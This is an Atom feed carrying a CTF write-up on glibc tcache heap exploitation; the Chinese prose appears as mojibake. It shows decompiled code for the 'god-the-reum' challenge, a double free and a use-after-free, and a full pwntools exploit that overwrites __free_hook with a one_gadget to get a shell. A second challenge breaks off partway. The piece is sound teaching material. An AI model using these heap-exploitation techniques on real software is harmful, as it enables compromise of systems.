<?xml version="1.0" encoding="utf-8"?>
<feed xmlns="http://www.w3.org/2005/Atom">
  <title>Kir[A]</title>
  
  
  <link href="/atom.xml" rel="self"/>
  
  <link href="https://4f-kira.github.io/"/>
  <updated>2019-05-31T02:17:03.762Z</updated>
  <id>https://4f-kira.github.io/</id>
  
  <author>
    <name>kira</name>
    
  </author>
  
  <generator uri="http://hexo.io/">Hexo</generator>
  
  <entry>
    <title>tcacheåœ¨pwné¢˜ä¸­å¸¸è§çš„åˆ©ç”¨å§¿åŠ¿</title>
    <link href="https://4f-kira.github.io/2019/05/31/tcahe-pwn/"/>
    <id>https://4f-kira.github.io/2019/05/31/tcahe-pwn/</id>
    <published>2019-05-31T02:12:10.000Z</published>
    <updated>2019-05-31T02:17:03.762Z</updated>
    
    <content type="html"><![CDATA[<p>æœ¬æ–‡é¦–å‘äºå…ˆçŸ¥è®ºå› <a href="https://xz.aliyun.com/t/4102" target="_blank" rel="noopener">https://xz.aliyun.com/t/4102</a></p><h2 id="å‰è¨€"><a href="#å‰è¨€" class="headerlink" title="å‰è¨€"></a>å‰è¨€</h2><p>tcacheæ˜¯ glibc 2.26(ubuntu 17.10) ä¹‹åå¼•å…¥çš„ä¸€ç§æŠ€æœ¯ï¼Œç›®çš„æ˜¯æå‡å †ç®¡ç†çš„æ€§èƒ½ï¼Œæœ€è¿‘tcacheæœºåˆ¶çš„pwné¢˜è¶Šæ¥è¶Šå¤šï¼Œè¶ç€æ˜¥èŠ‚æ”¾å‡ï¼Œå­¦ä¹ äº†ä¸€ä¸‹tcacheåœ¨pwné¢˜ä¸­æ˜¯å¦‚ä½•åˆ©ç”¨çš„ã€‚ä¸‹é¢é€šè¿‡å‡ æ¡tcacheçš„é¢˜ç›®ï¼Œåˆ†äº«ä¸‹æ­¤ç±»é¢˜ç›®å¸¸è§„åˆ©ç”¨å§¿åŠ¿ã€‚</p><h2 id="é¢˜ç›®é“¾æ¥"><a href="#é¢˜ç›®é“¾æ¥" class="headerlink" title="é¢˜ç›®é“¾æ¥"></a>é¢˜ç›®é“¾æ¥</h2><p>é“¾æ¥: <a href="https://pan.baidu.com/s/11EIvOiNOsFTFWavScsR7eQ" target="_blank" rel="noopener">https://pan.baidu.com/s/11EIvOiNOsFTFWavScsR7eQ</a> æå–ç : vter</p><p>éœ€è¦ä½¿ç”¨Ubuntu17.04ä»¥ä¸Šç‰ˆæœ¬è¿›è¡Œç»ƒä¹ ã€‚</p><h2 id="tcacheåŸºç¡€çŸ¥è¯†"><a href="#tcacheåŸºç¡€çŸ¥è¯†" class="headerlink" title="tcacheåŸºç¡€çŸ¥è¯†"></a>tcacheåŸºç¡€çŸ¥è¯†</h2><p>tcacheçš„ä»‹ç»å¯ä»¥å‚è€ƒCTFwikiï¼š<a href="https://ctf-wiki.github.io/ctf-wiki/pwn/linux/glibc-heap/tcache_attack/" target="_blank" rel="noopener">https://ctf-wiki.github.io/ctf-wiki/pwn/linux/glibc-heap/tcache_attack/</a> ï¼Œæˆ–è€…å„å¤§å¸ˆå‚…çš„åšå®¢ï¼Œéƒ½æœ‰è¯¦å°½çš„ä»‹ç»ï¼Œåœ¨æ­¤æˆ‘å°±ä¸å¤šèµ˜è¿°äº†ã€‚</p><h2 id="CodegateCTF2019-god-the-reum"><a href="#CodegateCTF2019-god-the-reum" class="headerlink" title="CodegateCTF2019 god-the-reum"></a>CodegateCTF2019 god-the-reum</h2><p>æ‰“å¼€ç¨‹åºçœ‹ä¸€ä¸‹ï¼Œæ˜¯ä¸ªç»å…¸çš„èœå•ç¨‹åº<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">====== Ethereum wallet service ========</span><br><span class="line">1. Create new wallet</span><br><span class="line">2. Deposit eth</span><br><span class="line">3. Withdraw eth</span><br><span class="line">4. Show all wallets</span><br><span class="line">5. exit</span><br></pre></td></tr></table></figure></p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br></pre></td><td class="code"><pre><span class="line">__int64 __<span class="function">fastcall <span class="title">main</span><span class="params">(__int64 a1, <span class="keyword">char</span> **a2, <span class="keyword">char</span> **a3)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">char</span> *v3; <span class="comment">// rdi</span></span><br><span class="line">  <span class="keyword">char</span> v5[<span class="number">88</span>]; <span class="comment">// [rsp+20h] [rbp-60h]</span></span><br><span class="line">  <span class="keyword">unsigned</span> __int64 v6; <span class="comment">// [rsp+78h] [rbp-8h]</span></span><br><span class="line">  __int64 savedregs; <span class="comment">// [rsp+80h] [rbp+0h]</span></span><br><span class="line"></span><br><span class="line">  v6 = __readfsqword(<span class="number">0x28</span>u);</span><br><span class="line">  setvbuf(<span class="built_in">stdout</span>, <span class="number">0L</span>L, <span class="number">2</span>, <span class="number">0L</span>L);</span><br><span class="line">  v3 = (<span class="keyword">char</span> *)<span class="built_in">stdin</span>;</span><br><span class="line">  setvbuf(<span class="built_in">stdin</span>, <span class="number">0L</span>L, <span class="number">2</span>, <span class="number">0L</span>L);</span><br><span class="line">  <span class="keyword">while</span> ( <span class="number">1</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    menu();</span><br><span class="line">    <span class="keyword">while</span> ( getchar() != <span class="number">10</span> )</span><br><span class="line">      ;</span><br><span class="line">    <span class="keyword">switch</span> ( (<span class="keyword">unsigned</span> <span class="keyword">int</span>)&amp;savedregs )</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="keyword">case</span> <span class="number">1u</span>:</span><br><span class="line">        v3 = &amp;v5[<span class="number">16</span> * dword_20202C];</span><br><span class="line">        create((<span class="keyword">void</span> **)v3);</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">      <span class="keyword">case</span> <span class="number">2u</span>:</span><br><span class="line">        v3 = &amp;v5[<span class="number">16</span> * (<span class="keyword">signed</span> <span class="keyword">int</span>)sub_11DC(v3)];</span><br><span class="line">        deposit((__int64)v3);</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">      <span class="keyword">case</span> <span class="number">3u</span>:</span><br><span class="line">        v3 = &amp;v5[<span class="number">16</span> * (<span class="keyword">signed</span> <span class="keyword">int</span>)sub_11DC(v3)];</span><br><span class="line">        withdraw((__int64)v3);</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">      <span class="keyword">case</span> <span class="number">4u</span>:</span><br><span class="line">        v3 = v5;</span><br><span class="line">        show((__int64)v5);</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">      <span class="keyword">case</span> <span class="number">5u</span>:</span><br><span class="line">        <span class="built_in">puts</span>(<span class="string">"bye da."</span>);</span><br><span class="line">        <span class="keyword">return</span> <span class="number">0L</span>L;</span><br><span class="line">      <span class="keyword">case</span> <span class="number">6u</span>:</span><br><span class="line">        v3 = &amp;v5[<span class="number">16</span> * (<span class="keyword">signed</span> <span class="keyword">int</span>)sub_11DC(v3)];</span><br><span class="line">        developer((__int64)v3);  <span class="comment">// éšè—åŠŸèƒ½</span></span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">      <span class="keyword">default</span>:</span><br><span class="line">        sub_11B3((__int64)v3, <span class="number">0L</span>L);</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>èœå•åŠŸèƒ½å¦‚ä¸‹ï¼š</p><ol><li>Create new walletï¼šåˆ›å»ºä¸€ä¸ªwalletï¼Œå¯æ§åˆ¶sizeï¼Œmallocä¸€ä¸ªchunkç”¨äºå­˜æ”¾ballance</li></ol><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">unsigned</span> __int64 __<span class="function">fastcall <span class="title">create</span><span class="params">(<span class="keyword">void</span> **a1)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">char</span> *v1; <span class="comment">// rax</span></span><br><span class="line">  <span class="keyword">unsigned</span> <span class="keyword">int</span> v2; <span class="comment">// eax</span></span><br><span class="line">  <span class="keyword">char</span> v4; <span class="comment">// [rsp+13h] [rbp-1Dh]</span></span><br><span class="line">  <span class="keyword">char</span> v5; <span class="comment">// [rsp+13h] [rbp-1Dh]</span></span><br><span class="line">  <span class="keyword">signed</span> <span class="keyword">int</span> i; <span class="comment">// [rsp+14h] [rbp-1Ch]</span></span><br><span class="line">  <span class="keyword">size_t</span> size; <span class="comment">// [rsp+18h] [rbp-18h]</span></span><br><span class="line">  <span class="keyword">void</span> *s; <span class="comment">// [rsp+20h] [rbp-10h]</span></span><br><span class="line">  <span class="keyword">unsigned</span> __int64 v9; <span class="comment">// [rsp+28h] [rbp-8h]</span></span><br><span class="line"></span><br><span class="line">  v9 = __readfsqword(<span class="number">0x28</span>u);</span><br><span class="line">  s = <span class="built_in">malloc</span>(<span class="number">0x82</span>uLL);</span><br><span class="line">  <span class="keyword">if</span> ( !s || dword_20202C &gt; <span class="number">4</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">"wallet creation failed"</span>);</span><br><span class="line">    <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="built_in">memset</span>(s, <span class="number">0</span>, <span class="number">0x82</span>uLL);</span><br><span class="line">  v1 = (<span class="keyword">char</span> *)s + <span class="built_in">strlen</span>((<span class="keyword">const</span> <span class="keyword">char</span> *)s);</span><br><span class="line">  *(_WORD *)v1 = 'x0';</span><br><span class="line">  v1[<span class="number">2</span>] = <span class="number">0</span>;</span><br><span class="line">  v2 = time(<span class="number">0L</span>L);</span><br><span class="line">  srand(v2);</span><br><span class="line">  <span class="keyword">for</span> ( i = <span class="number">0</span>; i &lt;= <span class="number">39</span>; ++i )</span><br><span class="line">  &#123;</span><br><span class="line">    v4 = rand() % <span class="number">15</span>;</span><br><span class="line">    <span class="keyword">if</span> ( v4 &gt; <span class="number">9</span> )</span><br><span class="line">      v5 = rand() % <span class="number">6</span> + <span class="number">97</span>;</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">      v5 = v4 + <span class="number">48</span>;</span><br><span class="line">    *((_BYTE *)s + i + <span class="number">2</span>) = v5;</span><br><span class="line">  &#125;</span><br><span class="line">  *a1 = s;</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">"how much initial eth? : "</span>, <span class="number">0L</span>L);</span><br><span class="line">  __isoc99_scanf(<span class="string">"%llu"</span>, &amp;size);</span><br><span class="line">  a1[<span class="number">1</span>] = <span class="built_in">malloc</span>(size);</span><br><span class="line">  <span class="keyword">if</span> ( a1[<span class="number">1</span>] )</span><br><span class="line">    *(_QWORD *)a1[<span class="number">1</span>] = size;</span><br><span class="line">  ++dword_20202C;</span><br><span class="line">  sub_119B();</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">"Creating new wallet succcess !\n"</span>);</span><br><span class="line">  sub_FD5(*a1, a1[<span class="number">1</span>]);</span><br><span class="line">  <span class="built_in">putchar</span>(<span class="number">10</span>);</span><br><span class="line">  <span class="keyword">return</span> __readfsqword(<span class="number">0x28</span>u) ^ v9;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><ol><li><p>Deposit ethï¼šå¢åŠ walletçš„ballanceï¼ˆæœ¬é¢˜ä¸­ç”¨ä¸åˆ°ï¼‰</p></li><li><p>Withdraw ethï¼šå‡å°‘walletçš„é‡‘é’±ï¼Œå¦‚æœå½“å‰ballanceä¸º0ï¼Œåˆ™freeæ‰ballanceçš„chunkï¼Œå¯<code>double free</code></p></li></ol><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">unsigned</span> __int64 __<span class="function">fastcall <span class="title">withdraw</span><span class="params">(__int64 a1)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  __int64 v2; <span class="comment">// [rsp+10h] [rbp-10h]</span></span><br><span class="line">  <span class="keyword">unsigned</span> __int64 v3; <span class="comment">// [rsp+18h] [rbp-8h]</span></span><br><span class="line"></span><br><span class="line">  v3 = __readfsqword(<span class="number">0x28</span>u);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">"how much you wanna withdraw? : "</span>);</span><br><span class="line">  __isoc99_scanf(<span class="string">"%llu"</span>, &amp;v2);</span><br><span class="line">  **(_QWORD **)(a1 + <span class="number">8</span>) -= v2;</span><br><span class="line">  <span class="keyword">if</span> ( !**(_QWORD **)(a1 + <span class="number">8</span>) )  <span class="comment">// åˆ¤æ–­æ˜¯å¦ä¸º0</span></span><br><span class="line">    <span class="built_in">free</span>(*(<span class="keyword">void</span> **)(a1 + <span class="number">8</span>));    <span class="comment">// double free</span></span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">"withdraw ok !\n"</span>);</span><br><span class="line">  <span class="keyword">return</span> __readfsqword(<span class="number">0x28</span>u) ^ v3;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><ol><li>Show all walletsï¼šæ‰“å°walletä¿¡æ¯ï¼Œæ²¡æœ‰ä»»ä½•æ£€æŸ¥ï¼Œå­˜åœ¨UAFæ¼æ´ã€‚</li></ol><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">int</span> __<span class="function">fastcall <span class="title">show</span><span class="params">(__int64 a1)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">int</span> i; <span class="comment">// [rsp+1Ch] [rbp-4h]</span></span><br><span class="line"></span><br><span class="line">  sub_119B();</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">"========== My Wallet List ============="</span>);</span><br><span class="line">  <span class="keyword">for</span> ( i = <span class="number">0</span>; i &lt; dword_20202C; ++i )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"%d) "</span>, (<span class="keyword">unsigned</span> <span class="keyword">int</span>)i);</span><br><span class="line">    sub_FD5(*(_QWORD *)(<span class="number">16L</span>L * i + a1), *(_QWORD *)(<span class="number">16L</span>L * i + a1 + <span class="number">8</span>)); <span class="comment">// printf("addr : %s, ballance %llu\n", a1, *a2, a1, a2);</span></span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> <span class="built_in">putchar</span>(<span class="number">10</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><ol><li>è¾“å…¥<code>6</code>å¯ä»¥è¿›å…¥ä¸€ä¸ªdeveloperçš„éšè—åŠŸèƒ½ï¼Œå¯å¯¹ballanceè¿›è¡Œä¿®æ”¹ã€‚</li></ol><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">__int64 __<span class="function">fastcall <span class="title">developer</span><span class="params">(__int64 a1)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  sub_119B();</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">"this menu is only for developer"</span>);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">"if you are not developer, please get out"</span>);</span><br><span class="line">  sleep(<span class="number">1u</span>);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">"new eth : "</span>);</span><br><span class="line">  <span class="keyword">return</span> __isoc99_scanf(<span class="string">"%10s"</span>, *(_QWORD *)(a1 + <span class="number">8</span>));</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>é¢˜ç›®åˆ†æï¼š</p><ol><li>é¦–å…ˆéœ€è¦æ³„éœ²libcåœ°å€ï¼Œæ–¹æ³•æœ‰ä¸¤ä¸ªï¼Œéœ€è¦åˆ©ç”¨<code>tcache</code>çš„ç‰¹ç‚¹</li></ol><ul><li>é»˜è®¤æƒ…å†µä¸‹ï¼Œå•é“¾è¡¨ä¸ªæ•°æ˜¯64ä¸ªï¼Œå¯å®¹çº³çš„æœ€å¤§å†…å­˜å—å¤§å°æ˜¯1032ï¼ˆ0x408ï¼‰</li><li>å•ä¸ªtcache binsé»˜è®¤æœ€å¤šåŒ…å«7ä¸ªå—</li></ul><p>æ–¹æ³•ä¸€ï¼šé‚£ä¹ˆï¼Œåªè¦æˆ‘ä»¬åˆ›å»ºä¸€ä¸ªå¤§äº0x408çš„chunkï¼Œfreeæ‰ä¹‹åå°±èƒ½è¿›å…¥unsorted binsï¼Œç„¶åæ³„éœ²libcåœ°å€çš„æ–¹æ³•å°±ä¸glibc 2.23ä»¥ä¸‹ç‰ˆæœ¬ä¸€æ ·ã€‚</p><p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20190214104424-70274be6-3002-1.png" alt=""></p><p>æ–¹æ³•äºŒï¼šå…ˆæŠŠtcache binså¡«æ»¡ï¼Œä¸€èˆ¬æƒ…å†µå°±æ˜¯7ä¸ªï¼Œä¹‹åfreeæ‰çš„chunkå°±èƒ½è¿›å…¥unsorted binäº†ã€‚åˆ©ç”¨<code>double free</code>æŠŠ<code>tcache</code>å¡«æ»¡7ä¸ªåï¼Œæ³„éœ²libcåœ°å€ã€‚æ³¨æ„é¦–æ¬¡<code>double free</code>åé‡‘é¢å˜æˆheapåœ°å€ï¼Œå¯ä»¥ç”¨showåŠŸèƒ½æ‰“å°ballanceï¼Œç„¶åç»§ç»­<code>double free</code>ã€‚</p><p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20190214104452-80cd641c-3002-1.png" alt=""></p><ol><li>ä½¿ç”¨<code>tcache poisoning</code>è¿›è¡Œä»»æ„åœ°å€å†™</li></ol><p><code>tache posioning</code> å’Œ <code>fastbin attack</code>ç±»ä¼¼ï¼Œè€Œä¸”é™åˆ¶æ›´åŠ å°‘ï¼Œä¸ä¼šæ£€æŸ¥sizeï¼Œç›´æ¥ä¿®æ”¹ <code>tcache</code> ä¸­çš„ fdï¼Œä¸éœ€è¦ä¼ªé€ ä»»ä½• chunk ç»“æ„å³å¯å®ç° malloc åˆ°ä»»ä½•åœ°å€ã€‚åˆ›å»ºä¸€ä¸ªä¸å¤§äº<code>0x408</code>çš„chunkï¼Œfreeæ‰åå³å¯è¿›å…¥<code>tcache</code>ï¼Œåˆ©ç”¨developerçš„éšè—åŠŸèƒ½ï¼Œå¯ä»¥ä¿®æ”¹<code>tcache</code>çš„fdä¸º<code>free_hook</code>çš„åœ°å€ï¼Œè¿›è¡Œä¸¤æ¬¡åˆ†é…åï¼Œå³å¯åˆ†é…åˆ°<code>free_hook</code>çš„åœ°å€ï¼Œå†æ¬¡ä½¿ç”¨developerçš„éšè—åŠŸèƒ½ç›´æ¥æŠŠ<code>free_hook</code>æ”¹æˆ<code>system</code>æˆ–è€…<code>onegadget</code>å³å¯getshellã€‚</p><p>å®Œæ•´expï¼š</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">p = process(<span class="string">'./god-the-reum'</span>)</span><br><span class="line">libc = ELF(<span class="string">'/lib/x86_64-linux-gnu/libc-2.27.so'</span>)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">create</span><span class="params">(n)</span>:</span></span><br><span class="line">p.sendlineafter(<span class="string">'select your choice :'</span>,<span class="string">'1'</span>)</span><br><span class="line">p.sendlineafter(<span class="string">'initial eth? : '</span>,str(n))</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">withdraw</span><span class="params">(idx,n)</span>:</span></span><br><span class="line">p.sendlineafter(<span class="string">'select your choice :'</span>,<span class="string">'3'</span>)</span><br><span class="line">p.sendlineafter(<span class="string">'wallet no : '</span>,str(idx))</span><br><span class="line">p.sendlineafter(<span class="string">'withdraw? : '</span>,str(n))</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">show</span><span class="params">()</span>:</span></span><br><span class="line">p.sendlineafter(<span class="string">'select your choice :'</span>,<span class="string">'4'</span>)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">developer</span><span class="params">(idx,n)</span>:</span></span><br><span class="line">p.sendlineafter(<span class="string">'select your choice :'</span>,<span class="string">'6'</span>)</span><br><span class="line">p.sendlineafter(<span class="string">'wallet no : '</span>,str(idx))</span><br><span class="line">p.sendlineafter(<span class="string">'new eth : '</span>,str(n))</span><br><span class="line"></span><br><span class="line"><span class="comment"># leak libc addr</span></span><br><span class="line">create(<span class="number">0x100</span>) <span class="comment"># 0</span></span><br><span class="line">create(<span class="number">0x90</span>) <span class="comment"># 1</span></span><br><span class="line">withdraw(<span class="number">0</span>,<span class="number">0x100</span>)</span><br><span class="line">withdraw(<span class="number">0</span>,<span class="number">0</span>)</span><br><span class="line">show()</span><br><span class="line">p.recvuntil(<span class="string">'ballance '</span>)</span><br><span class="line">heap_addr = int(p.recvuntil(<span class="string">'\n'</span>).strip())</span><br><span class="line"><span class="keyword">print</span> hex(heap_addr)</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">6</span>):</span><br><span class="line">withdraw(<span class="number">0</span>,heap_addr)</span><br><span class="line">show()</span><br><span class="line">p.recvuntil(<span class="string">'ballance '</span>)</span><br><span class="line">libc.address = int(p.recvuntil(<span class="string">'\n'</span>).strip()) - <span class="number">0x3ebc40</span> - <span class="number">96</span></span><br><span class="line">success(<span class="string">'libc.address:&#123;:#x&#125;'</span>.format(libc.address))</span><br><span class="line"><span class="comment"># overwrite free_hook to onegadget</span></span><br><span class="line">withdraw(<span class="number">1</span>,<span class="number">0x90</span>)</span><br><span class="line">developer(<span class="number">1</span>,p64(libc.sym[<span class="string">'__free_hook'</span>]))</span><br><span class="line">create(<span class="number">0x90</span>) <span class="comment"># 2</span></span><br><span class="line">create(<span class="number">0x90</span>) <span class="comment"># 3</span></span><br><span class="line">one_gadget = libc.address + <span class="number">0x4f322</span></span><br><span class="line">developer(<span class="number">3</span>,p64(one_gadget))</span><br><span class="line">withdraw(<span class="number">2</span>,<span class="number">0x90</span>)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure><h2 id="hitbxctf2018-gundam"><a href="#hitbxctf2018-gundam" class="headerlink" title="hitbxctf2018 gundam"></a>hitbxctf2018 gundam</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">1 . Build a gundam</span><br><span class="line">2 . Visit gundams</span><br><span class="line">3 . Destory a gundam</span><br><span class="line">4 . Blow up the factory</span><br><span class="line">5 . Exit</span><br><span class="line"></span><br><span class="line">Your choice :</span><br></pre></td></tr></table></figure><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">void</span> __<span class="function">fastcall <span class="title">main</span><span class="params">(__int64 a1, <span class="keyword">char</span> **a2, <span class="keyword">char</span> **a3)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">char</span> buf; <span class="comment">// [rsp+Eh] [rbp-12h]</span></span><br><span class="line">  <span class="keyword">unsigned</span> __int64 v4; <span class="comment">// [rsp+18h] [rbp-8h]</span></span><br><span class="line">  __int64 savedregs; <span class="comment">// [rsp+20h] [rbp+0h]</span></span><br><span class="line"></span><br><span class="line">  v4 = __readfsqword(<span class="number">0x28</span>u);</span><br><span class="line">  sub_1022(a1, a2, a3);</span><br><span class="line">  <span class="keyword">while</span> ( <span class="number">1</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    menu();</span><br><span class="line">    read(<span class="number">0</span>, &amp;buf, <span class="number">8u</span>LL);</span><br><span class="line">    atoi(&amp;buf);</span><br><span class="line">    <span class="keyword">switch</span> ( (<span class="keyword">unsigned</span> <span class="keyword">int</span>)&amp;savedregs )</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="keyword">case</span> <span class="number">1u</span>:</span><br><span class="line">        bulid();</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">      <span class="keyword">case</span> <span class="number">2u</span>:</span><br><span class="line">        visit();</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">      <span class="keyword">case</span> <span class="number">3u</span>:</span><br><span class="line">        destory();</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">      <span class="keyword">case</span> <span class="number">4u</span>:</span><br><span class="line">        blow_up();</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">      <span class="keyword">case</span> <span class="number">5u</span>:</span><br><span class="line">        <span class="built_in">puts</span>(<span class="string">"Exit...."</span>);</span><br><span class="line">        <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">        <span class="keyword">return</span>;</span><br><span class="line">      <span class="keyword">default</span>:</span><br><span class="line">        <span class="built_in">puts</span>(<span class="string">"Invalid choice"</span>);</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">    &#125;</span><br><span class="line">  